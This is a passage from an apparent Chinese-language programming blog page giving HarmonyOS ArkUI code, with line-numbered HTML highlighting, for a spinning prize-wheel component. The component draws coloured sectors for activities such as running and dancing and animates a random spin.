class="string">&quot;#18181a&quot;</span>); <span class="comment">// 设置背景颜色</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="turntable"><a href="#turntable" class="headerlink" title="turntable"></a>turntable</h1><p>转盘</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CounterComponent</span>, <span class="title class_">CounterType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>; <span class="comment">// 导入计数器组件和计数器类型</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义扇形组件</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Sector</span> &#123;</span><br><span class="line">  @<span class="title class_">Prop</span> <span class="attr">radius</span>: number; <span class="comment">// 扇形的半径</span></span><br><span class="line">  @<span class="title class_">Prop</span> <span class="attr">angle</span>: number; <span class="comment">// 扇形的角度</span></span><br><span class="line">  @<span class="title class_">Prop</span> <span class="attr">color</span>: string; <span class="comment">// 扇形的颜色</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 创建扇形路径的函数</span></span><br><span class="line">  <span class="title function_">createSectorPath</span>(<span class="attr">radius</span>: number, <span class="attr">angle</span>: number): string &#123;</span><br><span class="line">    <span class="keyword">const</span> centerX = radius / <span class="number">2</span>; <span class="comment">// 计算扇形中心的X坐标</span></span><br><span class="line">    <span class="keyword">const</span> centerY = radius / <span class="number">2</span>; <span class="comment">// 计算扇形中心的Y坐标</span></span><br><span class="line">    <span class="keyword">const</span> startX = centerX; <span class="comment">// 扇形起始点的X坐标</span></span><br><span class="line">    <span class="keyword">const</span> startY = centerY - radius; <span class="comment">// 扇形起始点的Y坐标</span></span><br><span class="line">    <span class="keyword">const</span> halfAngle = angle / <span class="number">4</span>; <span class="comment">// 计算半个角度</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 计算扇形结束点1的坐标</span></span><br><span class="line">    <span class="keyword">const</span> endX1 = centerX + radius * <span class="title class_">Math</span>.<span class="title function_">cos</span>((halfAngle * <span class="title class_">Math</span>.<span class="property">PI</span>) / <span class="number">180</span>);</span><br><span class="line">    <span class="keyword">const</span> endY1 = centerY - radius * <span class="title class_">Math</span>.<span class="title function_">sin</span>((halfAngle * <span class="title class_">Math</span>.<span class="property">PI</span>) / <span class="number">180</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 计算扇形结束点2的坐标</span></span><br><span class="line">    <span class="keyword">const</span> endX2 = centerX + radius * <span class="title class_">Math</span>.<span class="title function_">cos</span>((-halfAngle * <span class="title class_">Math</span>.<span class="property">PI</span>) / <span class="number">180</span>);</span><br><span class="line">    <span class="keyword">const</span> endY2 = centerY - radius * <span class="title class_">Math</span>.<span class="title function_">sin</span>((-halfAngle * <span class="title class_">Math</span>.<span class="property">PI</span>) / <span class="number">180</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 判断是否为大弧</span></span><br><span class="line">    <span class="keyword">const</span> largeArcFlag = angle / <span class="number">2</span> &gt; <span class="number">180</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> sweepFlag = <span class="number">1</span>; <span class="comment">// 设置弧线方向为顺时针</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 生成SVG路径命令</span></span><br><span class="line">    <span class="keyword">const</span> pathCommands =</span><br><span class="line">      <span class="string">`M<span class="subst">$&#123;startX&#125;</span> <span class="subst">$&#123;startY&#125;</span> A<span class="subst">$&#123;radius&#125;</span> <span class="subst">$&#123;radius&#125;</span> 0 <span class="subst">$&#123;largeArcFlag&#125;</span> <span class="subst">$&#123;sweepFlag&#125;</span> <span class="subst">$&#123;endX1&#125;</span> <span class="subst">$&#123;endY1&#125;</span> L<span class="subst">$&#123;centerX&#125;</span> <span class="subst">$&#123;centerY&#125;</span> L<span class="subst">$&#123;endX2&#125;</span> <span class="subst">$&#123;endY2&#125;</span> A<span class="subst">$&#123;radius&#125;</span> <span class="subst">$&#123;radius&#125;</span> 0 <span class="subst">$&#123;largeArcFlag&#125;</span> <span class="subst">$&#123;<span class="number">1</span> -</span></span></span><br><span class="line"><span class="subst"><span class="string">        sweepFlag&#125;</span> <span class="subst">$&#123;startX&#125;</span> <span class="subst">$&#123;startY&#125;</span> Z`</span>;</span><br><span class="line">    <span class="keyword">return</span> pathCommands; <span class="comment">// 返回路径命令</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建扇形组件</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Stack</span>() &#123;</span><br><span class="line">      <span class="comment">// 创建第一个扇形路径</span></span><br><span class="line">      <span class="title class_">Path</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.radius&#125;</span>px`</span>) <span class="comment">// 设置宽度为半径</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.radius&#125;</span>px`</span>) <span class="comment">// 设置高度为半径</span></span><br><span class="line">        .<span class="title function_">commands</span>(<span class="variable language_">this</span>.<span class="title function_">createSectorPath</span>(<span class="variable language_">this</span>.<span class="property">radius</span>, <span class="variable language_">this</span>.<span class="property">angle</span>)) <span class="comment">// 设置路径命令</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>) <span class="comment">// 设置填充透明度</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="variable language_">this</span>.<span class="property">color</span>) <span class="comment">// 设置填充颜色</span></span><br><span class="line">        .<span class="title function_">strokeWidth</span>(<span class="number">0</span>) <span class="comment">// 设置边框宽度为0</span></span><br><span class="line">        .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="variable language_">this</span>.<span class="property">angle</span> / <span class="number">4</span> - <span class="number">90</span> &#125;); <span class="comment">// 旋转扇形</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 创建第二个扇形路径</span></span><br><span class="line">      <span class="title class_">Path</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.radius&#125;</span>px`</span>) <span class="comment">// 设置宽度为半径</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.radius&#125;</span>px`</span>) <span class="comment">// 设置高度为半径</span></span><br><span class="line">        .<span class="title function_">commands</span>(<span class="variable language_">this</span>.<span class="title function_">createSectorPath</span>(<span class="variable language_">this</span>.<span class="property">radius</span>, <span class="variable language_">this</span>.<span class="property">angle</span>)) <span class="comment">// 设置路径命令</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>) <span class="comment">// 设置填充透明度</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="variable language_">this</span>.<span class="property">color</span>) <span class="comment">// 设置填充颜色</span></span><br><span class="line">        .<span class="title function_">strokeWidth</span>(<span class="number">0</span>) <span class="comment">// 设置边框宽度为0</span></span><br><span class="line">        .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">180</span> - (<span class="variable language_">this</span>.<span class="property">angle</span> / <span class="number">4</span> - <span class="number">90</span>) &#125;); <span class="comment">// 旋转扇形</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义单元格类</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cell</span> &#123;</span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">angle</span>: number = <span class="number">0</span>; <span class="comment">// 扇形的角度</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">title</span>: string; <span class="comment">// 当前格子的标题</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">color</span>: string; <span class="comment">// 背景颜色</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">rotate</span>: number = <span class="number">0</span>; <span class="comment">// 在转盘要旋转的角度</span></span><br><span class="line">  <span class="attr">angleStart</span>: number = <span class="number">0</span>; <span class="comment">// 轮盘所在区间的起始</span></span><br><span class="line">  <span class="attr">angleEnd</span>: number = <span class="number">0</span>; <span class="comment">// 轮盘所在区间的结束</span></span><br><span class="line">  <span class="attr">proportion</span>: number = <span class="number">0</span>; <span class="comment">// 所占比例</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构造函数</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">proportion: number, title: string, color: string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">proportion</span> = proportion; <span class="comment">// 设置比例</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">title</span> = title; <span class="comment">// 设置标题</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color; <span class="comment">// 设置颜色</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义转盘组件</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Wheel</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cells</span>: <span class="title class_">Cell</span>[] = []; <span class="comment">// 存储单元格的数组</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">wheelWidth</span>: number = <span class="number">600</span>; <span class="comment">// 转盘的宽度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentAngle</span>: number = <span class="number">0</span>; <span class="comment">// 当前转盘的角度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">selectedName</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// 选中的名称</span></span><br><span class="line">  <span class="attr">isAnimating</span>: boolean = <span class="literal">false</span>; <span class="comment">// 动画状态</span></span><br><span class="line">  <span class="attr">colorIndex</span>: number = <span class="number">0</span>; <span class="comment">// 颜色索引</span></span><br><span class="line">  <span class="attr">colorPalette</span>: string[] = [ <span class="comment">// 颜色调色板</span></span><br><span class="line">    <span class="string">&quot;#26c2ff&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#978efe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#c389fe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#ff85bd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#ff7051&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#fea800&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#ffcf18&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#a9c92a&quot;</span></span><br><span class="line">  ];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 组件即将出现时调用</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化单元格</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>, <span class="string">&quot;跑步&quot;</span>, <span class="variable language_">this</span>.<span class="property">colorPalette</span>[<span class="variable language_">this</span>.<span class="property">colorIndex</span>++ % <span class="variable language_">this</span>.<span class="property">colorPalette</span>.<span class="property">length</span>]));</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">2</span>, <span class="string">&quot;跳绳&quot;</span>, <span class="variable language_">this</span>.<span class="property">colorPalette</span>[<span class="variable language_">this</span>.<span class="property">colorIndex</span>++ % <span class="variable language_">this</span>.<span class="property">colorPalette</span>.<span class="property">length</span>]));</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>, <span class="string">&quot;唱歌&quot;</span>, <span class="variable language_">this</span>.<span class="property">colorPalette</span>[<span class="variable language_">this</span>.<span class="property">colorIndex</span>++ % <span class="variable language_">this</span>.<span class="property">colorPalette</span>.<span class="property">length</span>]));</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">4</span>, <span class="string">&quot;跳舞&quot;</span>, <span class="variable language_">this</span>.<span class="property">colorPalette</span>[<span class="variable language_">this</span>.<span class="property">colorIndex</span>++ % <span class="variable language_">this</span>.<span class="property">colorPalette</span>.<span class="property">length</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">calculateAngles</span>(); <span class="comment">// 计算角度</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 计算每个单元格的角度</span></span><br><span class="line">  private <span class="title function_">calculateAngles</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 根据比例计算总比例</span></span><br><span class="line">    <span class="keyword">const</span> totalProportion = <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, cell</span>) =&gt;</span> sum + cell.<span class="property">proportion</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">cell</span> =&gt;</span> &#123;</span><br><span class="line">      cell.<span class="property">angle</span> = (cell.<span class="property">proportion</span> * <span class="number">360</span>) / totalProportion; <span class="comment">// 计算每个单元格的角度</span></span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> cumulativeAngle = <span class="number">0</span>; <span class="comment">// 累计角度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">cell</span> =&gt;</span> &#123;</span><br><span class="line">      cell.<span class="property">angleStart</span> = cumulativeAngle; <span class="comment">// 设置起始角度</span></span><br><span class="line">      cumulativeAngle += cell.<span class="property">angle</span>; <span class="comment">// 更新累计角度</span></span><br><span class="line">      cell.<span class="property">angleEnd</span> = cumulativeAngle; <span class="comment">// 设置结束角度</span></span><br><span class="line">      cell.<span class="property">rotate</span> = cumulativeAngle - (cell.<span class="property">angle</span> / <span class="number">2</span>); <span class="comment">// 计算旋转角度</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建转盘组件</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123;</span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;转盘&#x27;</span>).<span class="title function_">fontSize</span>(<span class="number">20</span>).<span class="title function_">fontColor</span>(<span class="string">&quot;#0b0e15&quot;</span>); <span class="comment">// 显示转盘标题</span></span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="number">44</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Center</span>); <span class="comment">// 设置行的宽度和高度</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 显示当前状态</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="variable language_">this</span>.<span class="property">isAnimating</span> ? <span class="string">&#x27;旋转中&#x27;</span> : <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.selectedName&#125;</span>`</span>).<span class="title function_">fontSize</span>(<span class="number">20</span>).<span class="title function_">fontColor</span>(<span class="string">&quot;#0b0e15&quot;</span>).<span class="title function_">height</span>(<span class="number">40</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          <span class="comment">// 遍历每个单元格并绘制扇形</span></span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">cells</span>, <span class="function">(<span class="params">cell: Cell</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">Stack</span>() &#123;</span><br><span class="line">              <span class="title class_">Sector</span>(&#123; <span class="attr">radius</span>: <span class="title function_">lpx2px</span>(<span class="variable language_">this</span>.<span class="property">wheelWidth</span>) / <span class="number">2</span>, <span class="attr">angle</span>: cell.<span class="property">angle</span>, <span class="attr">color</span>: cell.<span class="property">color</span> &#125;); <span class="comment">// 创建扇形</span></span><br><span class="line">              <span class="title class_">Text</span>(cell.<span class="property">title</span>).<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>).<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.wheelWidth / <span class="number">1.4</span>&#125;</span>lpx`</span> &#125;); <span class="comment">// 显示单元格标题</span></span><br><span class="line">            &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: cell.<span class="property">rotate</span> &#125;); <span class="comment">// 设置宽度和高度，并旋转</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Gray</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.wheelWidth&#125;</span>lpx`</span>) <span class="comment">// 设置转盘宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.wheelWidth&#125;</span>lpx`</span>) <span class="comment">// 设置转盘高度</span></span><br><span class="line">        .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="variable language_">this</span>.<span class="property">currentAngle</span> &#125;); <span class="comment">// 旋转转盘</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 创建指针</span></span><br><span class="line">        <span class="title class_">Polygon</span>(&#123; <span class="attr">width</span>: <span class="number">20</span>, <span class="attr">height</span>: <span class="number">10</span> &#125;)</span><br><span class="line">          .<span class="title function_">points</span>([[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">10</span>, -<span class="number">20</span>], [<span class="number">20</span>, <span class="number">0</span>]]) <span class="comment">// 设置指针的点</span></span><br><span class="line">          .<span class="title function_">fill</span>(<span class="string">&quot;#d72b0b&quot;</span>) <span class="comment">// 设置指针颜色</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">20</span>) <span class="comment">// 设置指针高度</span></span><br><span class="line">          .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">&#x27;140lpx&#x27;</span> &#125;); <span class="comment">// 设置指针底部边距</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 创建开始按钮</span></span><br><span class="line">        <span class="title class_">Button</span>(<span class="string">&#x27;开始&#x27;</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="string">&quot;#c53a2c&quot;</span>) <span class="comment">// 设置按钮字体颜色</span></span><br><span class="line">          .<span class="title function_">borderWidth</span>(<span class="number">10</span>) <span class="comment">// 设置按钮边框宽度</span></span><br><span class="line">          .<span class="title function_">borderColor</span>(<span class="string">&quot;#dd2218&quot;</span>) <span class="comment">// 设置按钮边框颜色</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#fde427&quot;</span>) <span class="comment">// 设置按钮背景颜色</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;200lpx&#x27;</span>) <span class="comment">// 设置按钮宽度</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">&#x27;200lpx&#x27;</span>) <span class="comment">// 设置按钮高度</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// 设置按钮为圆形</span></span><br><span class="line">          .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span> &#125;) <span class="comment">// 设置点击效果</span></span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 点击按钮时的回调函数</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimating</span>) &#123; <span class="comment">// 如果正在动画中，返回</span></span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">selectedName</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 清空选中的名称</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimating</span> = <span class="literal">true</span>; <span class="comment">// 设置动画状态为正在动画</span></span><br><span class="line">            <span class="title function_">animateTo</span>(&#123; <span class="comment">// 开始动画</span></span><br><span class="line">              <span class="attr">duration</span>: <span class="number">5000</span>, <span class="comment">// 动画持续时间为5000毫秒</span></span><br><span class="line">              <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">EaseInOut</span>, <span class="comment">// 动画曲线为缓入缓出</span></span><br><span class="line">              <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">currentAngle</span> %= <span class="number">360</span>; <span class="comment">// 保持当前角度在0到360之间</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">const</span> cell <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">cells</span>) &#123; <span class="comment">// 遍历每个单元格</span></span><br><span class="line">                  <span class="comment">// 检查当前角度是否在单元格的角度范围内</span></span><br><span class="line">                  <span class="keyword">if</span> (<span class="number">360</span> - <span class="variable language_">this</span>.<span class="property">currentAngle</span> &gt;= cell.<span class="property">angleStart</span> &amp;&amp; <span class="number">360</span> - <span class="variable language_">this</span>.<span class="property">currentAngle</span> &lt;= cell.<span class="property">angleEnd</span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">selectedName</span> = cell.<span class="property">title</span>; <span class="comment">// 设置选中的名称为当前单元格的标题</span></span><br><span class="line">                    <span class="keyword">break</span>; <span class="comment">// 找到后退出循环</span></span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">isAnimating</span> = <span class="literal">false</span>; <span class="comment">// 设置动画状态为未动画</span></span><br><span class="line">              &#125;,</span><br><span class="line">            &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画进行中的回调</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">currentAngle</span> += (<span class="number">360</span> * <span class="number">5</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">360</span>)); <span class="comment">// 更新当前角度，增加随机旋转</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 创建滚动区域</span></span><br><span class="line">      <span class="title class_">Scroll</span>() &#123;</span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="comment">// 遍历每个单元格，创建输入框和计数器</span></span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">cells</span>, <span class="function">(<span class="params">item: Cell, index: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="comment">// 创建文本输入框，显示单元格标题</span></span><br><span class="line">              <span class="title class_">TextInput</span>(&#123; <span class="attr">text</span>: item.<span class="property">title</span> &#125;)</span><br><span 